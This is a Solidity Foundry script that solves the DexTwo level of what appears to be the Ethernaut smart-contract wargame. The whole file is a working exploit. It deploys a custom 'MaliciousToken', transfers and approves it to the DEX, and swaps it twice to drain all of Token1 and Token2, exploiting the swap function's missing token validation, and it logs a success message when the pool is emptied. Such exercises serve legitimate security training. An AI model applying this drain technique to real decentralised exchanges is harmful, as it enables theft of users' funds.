// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../../../src/levels/23_DexTwo/DexTwo.sol";
import "../../../src/levels/23_DexTwo/MaliciousToken.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

/**
 * @title DexTwoAttackDirectScript
 * @notice Direct EOA-based attack script to exploit DexTwo vulnerability
 * @dev Exploits the missing token validation in DexTwo.swap() function
 */
contract DexTwoAttackDirectScript is Script {
    DexTwo public dexTwo;
    MaliciousToken public malToken;
    address public token1;
    address public token2;
    address public player;

    function setUp() public {
        dexTwo = DexTwo(vm.envAddress("DEXTWO_TARGET"));
        player = vm.envAddress("PLAYER_ADDRESS");
        token1 = dexTwo.token1();
        token2 = dexTwo.token2();
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("=== DexTwo Direct Attack ===");
        console.log("DexTwo address:", address(dexTwo));
        console.log("Player address:", player);
        console.log("Token1 address:", token1);
        console.log("Token2 address:", token2);

        // Log initial state
        logState("Initial State");

        // Step 1: Deploy MaliciousToken with supply of 10000
        console.log("\n[Step 1] Deploying MaliciousToken...");
        malToken = new MaliciousToken(10000);
        console.log("MaliciousToken deployed at:", address(malToken));

        // Step 2: Transfer 100 MAL to DexTwo
        // This sets up the balance so that swapping 100 MAL gives us 100 Token1
        console.log("\n[Step 2] Transferring 100 MAL to DexTwo...");
        malToken.transfer(address(dexTwo), 100);
        console.log("DexTwo MAL balance:", malToken.balanceOf(address(dexTwo)));

        // Step 3: Approve DexTwo to spend our MAL tokens
        console.log("\n[Step 3] Approving DexTwo to spend MAL...");
        malToken.approve(address(dexTwo), type(uint256).max);
        console.log("Approval granted");

        // Step 4: Swap 100 MAL for all Token1
        // Calculation: swapAmount = (100 * 100) / 100 = 100 Token1
        console.log("\n[Step 4] Swapping 100 MAL for Token1...");
        uint256 expectedToken1 = dexTwo.getSwapAmount(address(malToken), token1, 100);
        console.log("Expected Token1 output:", expectedToken1);

        dexTwo.swap(address(malToken), token1, 100);
        logState("After first swap (MAL -> Token1)");

        // Step 5: Transfer 100 more MAL to DexTwo for second swap
        // After first swap, DexTwo has 200 MAL (100 initial + 100 from swap)
        // We add 100 more to get 300 MAL total
        console.log("\n[Step 5] Transferring 100 more MAL to DexTwo...");
        malToken.transfer(address(dexTwo), 100);
        console.log("DexTwo MAL balance:", malToken.balanceOf(address(dexTwo)));

        // Step 6: Swap 300 MAL for all Token2
        // Calculation: swapAmount = (300 * 100) / 300 = 100 Token2
        console.log("\n[Step 6] Swapping 300 MAL for Token2...");
        uint256 expectedToken2 = dexTwo.getSwapAmount(address(malToken), token2, 300);
        console.log("Expected Token2 output:", expectedToken2);

        dexTwo.swap(address(malToken), token2, 300);
        logState("After second swap (MAL -> Token2)");

        // Verify success
        uint256 dexToken1Balance = IERC20(token1).balanceOf(address(dexTwo));
        uint256 dexToken2Balance = IERC20(token2).balanceOf(address(dexTwo));

        console.log("\n=== ATTACK RESULT ===");
        if (dexToken1Balance == 0 && dexToken2Balance == 0) {
            console.log("SUCCESS! DexTwo has been completely drained!");
            console.log("Player Token1 balance:", IERC20(token1).balanceOf(player));
            console.log("Player Token2 balance:", IERC20(token2).balanceOf(player));
        } else {
            console.log("FAILED! DexTwo still has tokens:");
            console.log("DexTwo Token1:", dexToken1Balance);
            console.log("DexTwo Token2:", dexToken2Balance);
        }

        vm.stopBroadcast();
    }

    function logState(string memory label) internal view {
        console.log("\n--- %s ---", label);
        console.log("Player Token1:", IERC20(token1).balanceOf(player));
        console.log("Player Token2:", IERC20(token2).balanceOf(player));
        console.log("DexTwo Token1:", IERC20(token1).balanceOf(address(dexTwo)));
        console.log("DexTwo Token2:", IERC20(token2).balanceOf(address(dexTwo)));
    }
}
